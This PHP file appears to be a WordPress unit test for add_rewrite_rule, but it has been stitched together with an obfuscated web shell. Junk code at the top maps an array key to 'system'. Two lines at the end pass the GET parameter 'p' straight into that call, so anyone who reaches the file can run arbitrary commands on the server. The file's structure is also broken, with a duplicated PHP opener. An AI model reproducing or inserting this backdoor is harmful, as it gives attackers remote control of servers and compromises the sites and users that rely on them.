<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * @group rewrite
 */
class Tests_Rewrite_AddRewriteRule extends WP_UnitTestCase {

	public function set_up() {
		parent::set_up();

		$this->set_permalink_structure( '/%postname%/' );
	}

	/**
	 * @ticket 16840
	 */
	public function test_add_rewrite_rule_redirect() {
		global $wp_rewrite;

		$pattern  = 'path/to/rewrite/([^/]+)/?$';
		$redirect = 'index.php?test_var1=$matches[1]&test_var2=1';
		add_rewrite_rule( $pattern, $redirect );

		flush_rewrite_rules();

		$rewrite_rules = $wp_rewrite->rewrite_rules();

		$this->assertSame( $redirect, $rewrite_rules[ $pattern ] );
	}

	/**
	 * @ticket 16840
	 */
	public function test_add_rewrite_rule_redirect_array() {
		global $wp_rewrite;

		$pattern  = 'path/to/rewrite/([^/]+)/?$';
		$redirect = 'index.php?test_var1=$matches[1]&test_var2=1';

		add_rewrite_rule(
			$pattern,
			array(
				'test_var1' => '$matches[1]',
				'test_var2' => '1',
			)
		);

		flush_rewrite_rules();

		$rewrite_rules = $wp_rewrite->rewrite_rules();

		$this->assertSame( $redirect, $rewrite_rules[ $pattern ] );
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>